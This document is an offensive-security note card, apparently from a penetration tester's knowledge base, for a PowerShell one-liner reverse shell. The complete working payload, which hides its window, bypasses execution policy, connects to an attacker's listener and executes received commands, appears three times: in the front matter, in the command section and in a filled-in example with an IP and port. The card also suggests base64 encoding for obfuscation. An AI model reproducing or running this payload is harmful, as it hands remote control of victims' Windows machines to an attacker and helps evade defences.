---
type: command
executor: powershell
data: >-
  powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object
  System.Net.Sockets.TCPClient('$_ATTACKER_IP',$_ATTACKER_PORT); $stream =
  $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i =
  $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName
  System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data
  2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() };
  $client.Close()
output: null
platforms:
  - Windows
tags:
  - reverse-shell
  - powershell
verified: true
validated: true
---

# PowerShell-One-Liner-Reverse-Shell

## Command

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient('$_ATTACKER_IP',$_ATTACKER_PORT); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()
```

## Description

Executes a full PowerShell reverse shell in a single command line, bypassing common restrictions and hiding the window. Use this on a target with initial access to quickly gain interactive shell access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_IP | IP address of the attacker's listener | Yes |
| $_ATTACKER_PORT | Port on which the attacker is listening (e.g., 4444) | Yes |
| -NoP | NoProfile: Skips loading profiles | Built-in |
| -NonI | NonInteractive: Treats as non-interactive | Built-in |
| -W Hidden | WindowStyle Hidden: Hides the console window | Built-in |
| -Exec Bypass | ExecutionPolicy Bypass: Ignores execution policy | Built-in |

## Examples

### Basic Usage

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()
```

### Advanced Usage

For obfuscation, base64-encode the script and use -EncodedCommand instead.

## Expected Output

No direct output on target; success is indicated by a connection appearing on the attacker's listener (e.g., 'Connection from [target IP]'), followed by a PS> prompt where commands can be sent and output received, such as:

whoami

domain\user

PS C:\Users\user> 

## Related

- [[procedures/Establish-PowerShell-Reverse-Shell]]
- [[codes/PowerShell-TCP-Reverse-Shell]]
